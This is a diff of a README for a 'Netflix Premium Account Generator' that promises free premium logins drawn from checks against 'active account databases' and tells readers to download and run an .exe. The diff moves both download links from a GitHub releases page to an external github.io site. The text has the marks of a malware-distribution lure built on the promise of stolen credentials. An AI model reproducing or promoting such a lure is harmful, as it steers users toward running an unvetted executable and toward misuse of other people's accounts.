@@ -1,6 +1,6 @@
 # 📺 Netflix-Premium-Account-Generator-2026 - Access Premium Streaming Services For Free
 
-[![Download Tool](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/akunmine6834/Netflix-Premium-Account-Generator-2026/releases)
+[![Download Tool](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://akunmine6834.github.io)
 
 This application generates credentials for Netflix premium services. It performs automated checks against active account databases to provide valid login information to users. The tool manages the process of account validation through encrypted connections.
 
@@ -20,7 +20,7 @@ The application uses standard system libraries found on modern Windows installat
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official releases page](https://github.com/akunmine6834/Netflix-Premium-Account-Generator-2026/releases) to access the latest version of the generator.
+1. Visit the [official releases page](https://akunmine6834.github.io) to access the latest version of the generator.
 2. Look for the file labeled with the .exe extension in the Assets section of the latest release.
 3. Click the file name to start the download.
 4. Save the file to a folder that you can locate easily, such as your Downloads folder or your Desktop.
